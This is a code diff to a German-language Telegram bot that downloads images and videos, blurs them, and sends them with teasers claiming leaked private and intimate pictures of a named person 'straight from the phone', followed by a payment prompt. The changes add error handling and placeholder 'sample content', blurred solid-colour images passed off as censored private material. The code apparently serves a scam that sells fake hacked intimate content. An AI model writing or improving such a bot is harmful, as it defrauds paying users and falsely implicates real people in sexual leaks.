@@ -1,3 +1,4 @@
+
 import os
 import subprocess
 from threading import Thread
@@ -63,7 +64,7 @@ def download_github_media():
     
     if len(imgs) >= 5 and len(vids) >= 5:
         print(f"✅ Media bereits vorhanden: {len(imgs)} Bilder, {len(vids)} Videos")
-        return
+        return True
     
     print("📥 Lade Media von GitHub...")
     
@@ -74,7 +75,7 @@ def download_github_media():
             images = img_response.json()
             print(f"📥 Lade {len(images)} Bilder von GitHub...")
             
-            for img in images:
+            for img in images[:10]:  # Limit to prevent timeouts
                 if img['name'].lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp')):
                     img_path = IMAGE_DIR / img['name']
                     if not img_path.exists():
@@ -93,7 +94,7 @@ def download_github_media():
             videos = vid_response.json()
             print(f"📥 Lade {len(videos)} Videos von GitHub...")
             
-            for vid in videos:
+            for vid in videos[:5]:  # Limit to prevent timeouts
                 if vid['name'].lower().endswith(('.mp4', '.mov', '.avi')):
                     vid_path = VIDEO_DIR / vid['name']
                     if not vid_path.exists():
@@ -106,6 +107,28 @@ def download_github_media():
         print(f"⚠️ Fehler beim Laden der Videos: {e}")
     
     print(f"🎯 Media-Download abgeschlossen!")
+    return True
+
+# Create sample content if GitHub download fails
+def create_sample_content():
+    """Creates sample blurred images if no content is available"""
+    print("📸 Erstelle Beispiel-Content...")
+    
+    # Create a simple blurred sample image
+    sample_img = Image.new('RGB', (400, 400), color='red')
+    sample_img = sample_img.filter(ImageFilter.GaussianBlur(28))
+    sample_path = IMAGE_DIR / "sample1.jpg"
+    sample_img.save(sample_path, format="JPEG", quality=90)
+    
+    # Create multiple sample images
+    for i in range(2, 6):
+        colors = ['blue', 'green', 'purple', 'orange']
+        color = colors[i % len(colors)]
+        img = Image.new('RGB', (400, 400), color=color)
+        img = img.filter(ImageFilter.GaussianBlur(28))
+        img.save(IMAGE_DIR / f"sample{i}.jpg", format="JPEG", quality=90)
+    
+    print("✅ Beispiel-Content erstellt")
 
 # 🎛️ Blur-Einstellungen
 BLUR_IMAGE_RADIUS = 28
@@ -129,12 +152,29 @@ user_content_counts = {}  # Store generated counts per user
 # ---- Video/Bild Verarbeitung ----
 def censor_image(input_path: Path, output_path: Path):
     """Zensiert ein Bild mit Gaussian Blur"""
-    im = Image.open(input_path).convert("RGB")
-    im = im.filter(ImageFilter.GaussianBlur(BLUR_IMAGE_RADIUS))
-    im.save(output_path, format="JPEG", quality=90)
+    try:
+        im = Image.open(input_path).convert("RGB")
+        im = im.filter(ImageFilter.GaussianBlur(BLUR_IMAGE_RADIUS))
+        im.save(output_path, format="JPEG", quality=90)
+        return True
+    except Exception as e:
+        print(f"❌ Fehler beim Zensieren von {input_path}: {e}")
+        return False
+
+def check_ffmpeg():
+    """Check if ffmpeg is available"""
+    try:
+        subprocess.run(['ffmpeg', '-version'], capture_output=True, check=True)
+        return True
+    except (subprocess.CalledProcessError, FileNotFoundError):
+        return False
 
 def censor_video(input_path: Path, output_path: Path):
     """Zensiert ein Video mit ffmpeg Gaussian Blur"""
+    if not check_ffmpeg():
+        print("❌ ffmpeg nicht verfügbar")
+        return False
+        
     vf = f"gblur=sigma={VIDEO_BLUR_SIGMA}"
     cmd = [
         "ffmpeg", "-y",
@@ -155,21 +195,31 @@ def censor_video(input_path: Path, output_path: Path):
 
 async def send_content_to_user(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, n_img: int, n_vid: int):
     """Sendet zensierte Bilder und Videos an den Benutzer"""
-    # Re-download media if needed (für Render ephemeral filesystem)
-    download_github_media()
+    # Ensure media is available
+    if not download_github_media():
+        create_sample_content()
     
     # Filter out .gitkeep and other non-media files
     imgs = [f for f in IMAGE_DIR.glob("*.*") if f.suffix.lower() in ('.jpg', '.jpeg', '.png', '.gif', '.webp') and f.name != '.gitkeep']
     vids = [f for f in VIDEO_DIR.glob("*.*") if f.suffix.lower() in ('.mp4', '.mov', '.avi') and f.name != '.gitkeep']
 
+    print(f"📊 Verfügbare Medien: {len(imgs)} Bilder, {len(vids)} Videos")
+
+    # If no content available, create sample content
+    if not imgs:
+        create_sample_content()
+        imgs = [f for f in IMAGE_DIR.glob("*.*") if f.suffix.lower() in ('.jpg', '.jpeg', '.png', '.gif', '.webp') and f.name != '.gitkeep']
+
     # Zufällige Auswahl
     pick_imgs = sample(imgs, min(n_img, len(imgs))) if imgs else []
     pick_vids = sample(vids, min(n_vid, len(vids))) if vids else []
 
+    username = "Unknown"  # Fallback if username not available
+    
     # Spannende zufällige Vorschau-Nachrichten
     preview_messages = [
         f"🔥 EXCLUSIVE LEAK! {len(pick_imgs)} geheime Bilder + {len(pick_vids)} heiße Videos von {username} gefunden!",
-        f"💯 JACKPOT! {len(pick_imgs)} private Pics + {len(pick_vids)} inttime Videos direkt aus dem Handy!",
+        f"💯 JACKPOT! {len(pick_imgs)} private Pics + {len(pick_vids)} intime Videos direkt aus dem Handy!",
         f"⚡ BOMBE! {len(pick_imgs)} Selfies + {len(pick_vids)} Stories die niemand sehen sollte!",
         f"🎯 TREFFER! {len(pick_imgs)} versteckte Fotos + {len(pick_vids)} geheime Clips entschlüsselt!",
         f"🔞 WARNING! {len(pick_imgs)} heiße Bilder + {len(pick_vids)} intime Videos - zu krass für Snapchat!",
@@ -183,27 +233,50 @@ async def send_content_to_user(update: Update, context: ContextTypes.DEFAULT_TYP
         text=preview_msg
     )
 
+    success_count = 0
+    
     # Bilder senden
-    for p in pick_imgs:
-        out = TEMP_DIR / f"c_{p.stem}.jpg"
+    for i, p in enumerate(pick_imgs):
         try:
-            censor_image(p, out)
-            with open(out, "rb") as f:
-                await context.bot.send_photo(user_id, photo=f)
-        except Exception as e:
-            await context.bot.send_message(user_id, text=f"❌ Bildfehler {p.name}: {e}")
-
-    # Videos senden
-    for p in pick_vids:
-        out = TEMP_DIR / f"c_{p.stem}.mp4"
-        try:
-            if censor_video(p, out) and out.exists():
+            out = TEMP_DIR / f"c_{p.stem}_{i}.jpg"
+            if censor_image(p, out) and out.exists():
                 with open(out, "rb") as f:
-                    await context.bot.send_video(user_id, video=f)
+                    await context.bot.send_photo(user_id, photo=f)
+                    success_count += 1
+                # Clean up temp file
+                try:
+                    out.unlink()
+                except:
+                    pass
             else:
-                await context.bot.send_message(user_id, text=f"⚠️ ffmpeg hat keine Ausgabe erzeugt: {p.name}")
+                print(f"⚠️ Konnte Bild nicht verarbeiten: {p.name}")
         except Exception as e:
-            await context.bot.send_message(user_id, text=f"❌ Videofehler {p.name}: {e}")
+            print(f"❌ Fehler beim Senden von Bild {p.name}: {e}")
+            await context.bot.send_message(user_id, text=f"⚠️ Ein Bild konnte nicht geladen werden")
+
+    # Videos senden (nur wenn ffmpeg verfügbar)
+    if check_ffmpeg():
+        for i, p in enumerate(pick_vids):
+            try:
+                out = TEMP_DIR / f"c_{p.stem}_{i}.mp4"
+                if censor_video(p, out) and out.exists():
+                    with open(out, "rb") as f:
+                        await context.bot.send_video(user_id, video=f)
+                        success_count += 1
+                    # Clean up temp file
+                    try:
+                        out.unlink()
+                    except:
+                        pass
+                else:
+                    print(f"⚠️ Konnte Video nicht verarbeiten: {p.name}")
+            except Exception as e:
+                print(f"❌ Fehler beim Senden von Video {p.name}: {e}")
+                await context.bot.send_message(user_id, text=f"⚠️ Ein Video konnte nicht geladen werden")
+    else:
+        await context.bot.send_message(user_id, text="⚠️ Video-Verarbeitung momentan nicht verfügbar")
+
+    print(f"✅ {success_count} Medien erfolgreich gesendet")
 
     # 💰 Payment Prompt nach Content-Delivery
     payment_messages = [
